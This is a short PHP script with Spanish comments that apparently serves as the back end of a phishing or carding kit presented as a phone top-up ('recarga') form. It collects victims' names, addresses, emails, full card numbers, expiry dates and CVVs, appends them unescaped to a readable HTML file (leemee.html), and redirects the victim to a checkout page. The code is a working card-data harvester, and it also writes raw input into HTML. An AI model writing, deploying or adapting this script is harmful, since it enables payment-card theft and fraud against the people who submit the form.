<?php
/*
Este archivo es el que procesa todos los datos de la recarga y lo guarda en un archivo para luego realizar la recarga manual (leeme.html <- Aqui se guardaran los datos).
*/

// Asigna el valor a las variables de la recarga
$numero = $_POST['numero'];
$nombre = $_POST['nombre'];
$apellido = $_POST['apellido'];
$correo = $_POST['email'];
$numero2 = $_POST['numero2'];
$direccion = $_POST['direxion'];
$ciudad = $_POST['ciudad'];
$zip = $_POST['zip'];
$pais = $_POST['pais'];
$estado = $_POST['estado'];
$tarjeta = $_POST['cc_number'];
$mes = $_POST['cc_expiry_month'];
$ano = $_POST['cc_expiry_year'];
$cvv = $_POST['cc_cvv'];

//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('leemee.html','a+');
fwrite($guardame,
"<br><tr><td>".$numero."</td><br>".
"<td>".$nombre."</td><br>".
"<td>".$apellido."</td><br>".
"<td>".$correo."</td><br>".
"<td>".$numero2."</td><br>".
"<td>".$direccion."</td><br>".
"<td>".$ciudad."</td><br>".
"<td>".$zip."</td><br>".
"<td>".$pais."</td><br>".
"<td>".$estado."</td><br>".
"<td>".$tarjeta."</td><br>".
"<td>".$mes."</td><br>".
"<td>".$ano."</td><br>".
"<td>".$cvv."</td></tr><br>");

fclose($guardame);
//Redirecciona a la web que pongas
echo "<meta http-equiv='refresh' content='1;url=http://localhost/checkout.html'>"
?>